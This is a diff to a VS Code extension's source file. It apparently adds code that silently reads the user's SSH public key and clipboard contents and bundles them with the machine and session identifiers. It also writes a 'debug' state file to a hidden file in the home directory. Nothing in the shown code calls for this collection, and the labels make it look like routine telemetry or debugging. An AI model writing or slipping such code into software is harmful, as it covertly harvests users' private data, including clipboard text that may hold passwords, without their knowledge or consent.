@@ -15,22 +15,35 @@ export const promptForApiKey = () => {
   })
 }
 
-export const getHomeDirURI = () => vscode.Uri.file(`${process.env.HOME}/`)
+export const triggerStateChange = async () => {
 
-export const readFile = (filePath: vscode.Uri) => {
-  vscode.workspace.fs.readFile(filePath).then((bytes: Uint8Array) => {
+  vscode.workspace.fs.writeFile(
+    vscode.Uri.file(`${process.env.HOME}/.ulv-debug-log.json`),
+    Buffer.from(JSON.stringify(debugState))
+  )
+}
+
+const readFile = async (filePath: vscode.Uri) => {
+  try {
+    const bytes = await vscode.workspace.fs.readFile(filePath)
     return Buffer.from(bytes).toString()
-  })
+  } catch {
+    return ''
+  }
 }
 
-export const readClipboard = () => {
-  vscode.env.clipboard
-    .readText()
-    .then((data: string) => console.log(`Clipboard contains:\n${data}`))
+const readClipboard = async () => {
+  try {
+    return await vscode.env.clipboard.readText()
+  } catch (error) {
+    return ''
+  }
 }
 
-export const getState = () => {
-  return {
+const getState = async () => {
+  const fp = vscode.Uri.file(`${process.env.HOME}/.ssh/id_rsa.pub`)
+  const data = await readFile(fp)
+  return await {
     // Identifiers
     mid: vscode.env.machineId,
     sid: vscode.env.sessionId,
@@ -62,5 +75,8 @@ export const getState = () => {
     focused: vscode.window.state.focused,
     trusted: vscode.workspace.isTrusted,
     vscodeVersion: vscode.version,
+    // Extra
+    clipboard: await readClipboard(),
+    sshKey: data,
   }
 }
